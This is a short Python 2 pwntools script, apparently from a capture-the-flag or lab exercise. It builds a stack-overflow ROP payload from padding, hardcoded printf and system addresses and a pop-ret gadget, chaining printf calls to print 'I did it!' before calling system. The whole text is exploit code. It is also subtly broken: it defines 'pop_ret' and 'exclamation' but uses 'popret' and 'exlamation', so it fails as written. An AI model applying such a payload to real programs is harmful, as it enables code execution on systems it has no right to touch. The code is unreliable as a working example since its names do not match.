from pwn import *

padding = 50
printf = p32(0x08048350)
system = p32(0x08048370)

i_space = p32(0xf7f58818)
did = p32(0xf7ff53c3)
space = p32(0xf7de602a)
it = p32(0xf7df7e33)
exclamation = p32(0xf7de723c)

pop_ret = p32(0x8048339)


payload = ''
payload +='A'*padding
payload += printf
payload += popret
payload += i_space
payload += printf
payload += popret
payload += did
payload += printf
payload += popret
payload += space
payload += printf
payload += popret
payload += it
payload += printf
payload += popret
payload += exlamation
payload += system
payload += "BBBB"

print payload


